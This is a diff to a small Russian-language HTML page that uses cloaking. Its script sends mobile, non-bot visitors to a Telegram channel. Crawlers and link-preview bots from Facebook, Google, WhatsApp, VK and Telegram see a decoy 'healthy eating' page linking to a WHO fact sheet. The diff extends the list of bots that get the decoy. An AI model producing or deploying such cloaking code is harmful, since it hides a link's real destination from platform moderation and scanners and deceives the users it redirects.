@@ -1,22 +1,29 @@
-<script>
-  const isRealUser = () => {
-    const ua = navigator.userAgent.toLowerCase();
-    const mobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
-    const bot = /bot|facebook|crawler|preview|google/i.test(ua);
-    return mobile && !bot;
-  };
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Загрузка...</title>
+  <script>
+    const isRealUser = () => {
+      const ua = navigator.userAgent.toLowerCase();
+      const isMobile = /android|iphone|ipad|ipod|mobile/.test(ua);
+      const isBot = /bot|facebook|crawler|preview|google|whatsapp|vk|telegram/.test(ua);
+      return isMobile && !isBot;
+    };
 
-  if (isRealUser()) {
-    setTimeout(() => {
-      window.location.replace("https://t.me/paradise_opt");
-    }, 300);
-  } else {
-    document.write(`
-      <h1>Здоровое питание</h1>
-      <p>Официальные рекомендации по питанию от ВОЗ:</p>
-      <a href="https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet" target="_blank">
-        https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet
-      </a>
-    `);
-  }
-</script>
+    if (isRealUser()) {
+      location.href = "https://t.me/paradise_opt";
+    } else {
+      document.write(`
+        <h1>Здоровое питание</h1>
+        <p>Официальные рекомендации по питанию от ВОЗ:</p>
+        <a href="https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet" target="_blank">
+          https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet
+        </a>
+      `);
+    }
+  </script>
+</head>
+<body></body>
+</html>
+
